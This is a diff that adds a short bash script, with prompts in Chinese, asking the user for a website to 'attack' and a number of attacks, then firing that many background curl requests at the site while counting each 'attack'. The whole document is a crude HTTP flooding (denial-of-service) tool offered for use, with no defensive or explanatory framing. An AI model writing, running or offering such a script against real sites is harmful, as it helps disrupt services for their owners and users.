@@ -1,0 +1,8 @@
+read -p "请输入要攻击的网站:" ws
+read -p "请输入攻击次数:" quantity
+echo "开始攻击:"
+for q in $(seq 1 $quantity)
+do
+    curl -s  $ws > /dev/null&
+    echo "已攻击$q次 通过网址$ws"
+done
